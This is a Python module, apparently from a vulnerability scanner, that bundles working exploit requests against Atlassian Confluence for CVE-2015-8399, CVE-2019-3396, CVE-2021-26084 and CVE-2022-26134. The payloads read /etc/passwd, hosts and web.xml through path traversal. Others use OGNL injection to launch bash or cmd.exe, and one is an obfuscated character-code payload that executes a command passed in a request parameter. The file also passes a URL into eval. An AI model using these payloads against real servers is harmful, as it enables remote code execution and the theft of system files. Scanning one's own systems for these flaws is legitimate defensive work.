#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Atlassian Confluence扫描类: 
        1. Confluence路径遍历和命令执行
            CVE-2019-3396
                Payload: https://vulhub.org/#/environments/confluence/CVE-2019-3396/

        2. Confluence Server Webwork Pre-Auth OGNL表达式命令注入
            CVE-2021-26084
                Payload: https://vulhub.org/#/environments/confluence/CVE-2021-26084/

        3. Confluence任意文件包含
            CVE-2015-8399
                Payload: https://blog.csdn.net/caiqiiqi/article/details/106004003

        4. Confluence远程代码执行
            CVE-2022-26134
                Payload-1: https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134
                Payload-2: https://github.com/SNCKER/CVE-2022-26134

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
file:///C:/Windows/System32/drivers/etc/hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from lib.tool import head
from payloads.AtlassianConfluence.cve_2015_8399 import cve_2015_8399_scan
from payloads.AtlassianConfluence.cve_2019_3396 import cve_2019_3396_scan
from payloads.AtlassianConfluence.cve_2021_26084 import cve_2021_26084_scan
from payloads.AtlassianConfluence.cve_2022_26134 import cve_2022_26134_scan

class AtlassianConfluence():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers').copy()
        self.proxies = config.get('proxies')

        self.app_name = 'AtlassianConfluence'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2019_3396_payloads = [
            # { # * 用于命令执行, 需要将payload保存至.vm文件中, 然后加载远程文件
            #     'path': 'rest/tinymce/1/macro/preview',
            #     'data': '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.example.com/v/123456", "width": "1000"," height": "1000","_template":"https://www.example.com/confluence.vm","command":' + self.cmd + '}}}',
            #     'headers': self.headers.update({
            #         'Content-Type': 'application/json; charset=utf-8'
            #     })
            # },
            {
                'path': 'rest/tinymce/1/macro/preview',
                'data': '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.viddler.com/v/23464dc6", "width": "1000"," height": "1000","_template":"file:///etc/passwd"}}}',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json; charset=utf-8'})
            },
            {
                'path': 'rest/tinymce/1/macro/preview',
                'data': '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.viddler.com/v/23464dc6", "width": "1000"," height": "1000","_template":"file:///C:\Windows\System32\drivers\etc\hosts"}}}',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json; charset=utf-8'})
            },
            {
                'path': 'rest/tinymce/1/macro/preview',
                'data': '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.viddler.com/v/23464dc6", "width": "1000"," height": "1000","_template":"file:///C:/Windows/System32/drivers/etc/hosts"}}}',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json; charset=utf-8'})
            },
            {
                'path': 'rest/tinymce/1/macro/preview',
                'data': '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.viddler.com/v/23464dc6", "width": "1000"," height": "1000","_template":"../web.xml"}}}',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json; charset=utf-8'})
            }
        ]

        self.cve_2021_26084_payloads = [
            {
                'path': 'pages/doenterpagevariables.action',
                'data': 'queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022cat%20/etc/passwd%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'pages/doenterpagevariables.action',
                'data': 'queryString=%5cu0027%2b%7b555*666%7d%2b%5cu0027',
                'headers': head.merge(self.headers, {})
            }
        ]

        self.cve_2015_8399_payloads = [
            {
                'path': 'admin/viewdefaultdecorator.action?decoratorName=file:///etc/passwd',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'admin/viewdefaultdecorator.action?decoratorName=file:///C:\Windows\System32\drivers\etc\hosts',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'admin/viewdefaultdecorator.action?decoratorName=file:///C:/Windows/System32/drivers/etc/hosts',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'admin/viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'viewdefaultdecorator.action?decoratorName=file:///etc/passwd',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'viewdefaultdecorator.action?decoratorName=file:///C:\Windows\System32\drivers\etc\hosts',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'viewdefaultdecorator.action?decoratorName=file:///C:/Windows/System32/drivers/etc/hosts',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            # {
            #     'path': 'spaces/viewdefaultdecorator.action?decoratorName=file:///etc/passwd',
            #     'data': '',
            #     'headers': head.merge(self.headers, {})
            # },
            # {
            #     'path': 'spaces/viewdefaultdecorator.action?decoratorName=file:///C:\Windows\System32\drivers\etc\hosts',
            #     'data': '',
            #     'headers': head.merge(self.headers, {})
            # },
            # {
            #     'path': 'spaces/viewdefaultdecorator.action?decoratorName=file:///C:/Windows/System32/drivers/etc/hosts',
            #     'data': '',
            #     'headers': head.merge(self.headers, {})
            # },
            # {
            #     'path': 'spaces/viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml',
            #     'data': '',
            #     'headers': head.merge(self.headers, {})
            # }
        ]

        self.cve_2022_26134_payloads = [
            {
                'path': '%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo%20{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'.format(self.md),
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Confluence%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28118%2C97%2C114%2C32%2C114%2C101%2C113%2C61%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C99%2C111%2C109%2C46%2C111%2C112%2C101%2C110%2C115%2C121%2C109%2C112%2C104%2C111%2C110%2C121%2C46%2C119%2C101%2C98%2C119%2C111%2C114%2C107%2C46%2C83%2C101%2C114%2C118%2C108%2C101%2C116%2C65%2C99%2C116%2C105%2C111%2C110%2C67%2C111%2C110%2C116%2C101%2C120%2C116%2C46%2C103%2C101%2C116%2C82%2C101%2C113%2C117%2C101%2C115%2C116%2C40%2C41%2C59%2C13%2C10%2C118%2C97%2C114%2C32%2C99%2C109%2C100%2C61%2C114%2C101%2C113%2C46%2C103%2C101%2C116%2C80%2C97%2C114%2C97%2C109%2C101%2C116%2C101%2C114%2C40%2C34%2C115%2C101%2C97%2C114%2C99%2C104%2C34%2C41%2C59%2C13%2C10%2C118%2C97%2C114%2C32%2C114%2C117%2C110%2C116%2C105%2C109%2C101%2C61%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C106%2C97%2C118%2C97%2C46%2C108%2C97%2C110%2C103%2C46%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C46%2C103%2C101%2C116%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C40%2C41%2C59%2C13%2C10%2C118%2C97%2C114%2C32%2C101%2C110%2C99%2C111%2C100%2C101%2C114%2C61%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C106%2C97%2C118%2C97%2C46%2C117%2C116%2C105%2C108%2C46%2C66%2C97%2C115%2C101%2C54%2C52%2C46%2C103%2C101%2C116%2C69%2C110%2C99%2C111%2C100%2C101%2C114%2C40%2C41%2C59%2C13%2C10%2C101%2C110%2C99%2C111%2C100%2C101%2C114%2C46%2C101%2C110%2C99%2C111%2C100%2C101%2C84%2C111%2C83%2C116%2C114%2C105%2C110%2C103%2C40%2C110%2C101%2C119%2C32%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C106%2C97%2C118%2C97%2C46%2C117%2C116%2C105%2C108%2C46%2C83%2C99%2C97%2C110%2C110%2C101%2C114%2C40%2C114%2C117%2C110%2C116%2C105%2C109%2C101%2C46%2C101%2C120%2C101%2C99%2C40%2C99%2C109%2C100%2C41%2C46%2C103%2C101%2C116%2C73%2C110%2C112%2C117%2C116%2C83%2C116%2C114%2C101%2C97%2C109%2C40%2C41%2C41%2C46%2C117%2C115%2C101%2C68%2C101%2C108%2C105%2C109%2C105%2C116%2C101%2C114%2C40%2C34%2C92%2C92%2C65%2C34%2C41%2C46%2C110%2C101%2C120%2C116%2C40%2C41%2C46%2C103%2C101%2C116%2C66%2C121%2C116%2C101%2C115%2C40%2C41%2C41%29%29%22%29%29%7D/?search='+ self.cmd,
                'data': '',
                'headers': head.merge(self.headers, {})
            }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2015_8399_scan, url=url),
            thread(target=self.cve_2019_3396_scan, url=url),
            thread(target=self.cve_2021_26084_scan, url=url),
            thread(target=self.cve_2022_26134_scan, url=url)
        ]

AtlassianConfluence.cve_2015_8399_scan = cve_2015_8399_scan
AtlassianConfluence.cve_2019_3396_scan = cve_2019_3396_scan
AtlassianConfluence.cve_2021_26084_scan = cve_2021_26084_scan
AtlassianConfluence.cve_2022_26134_scan = cve_2022_26134_scan

confluence = AtlassianConfluence()
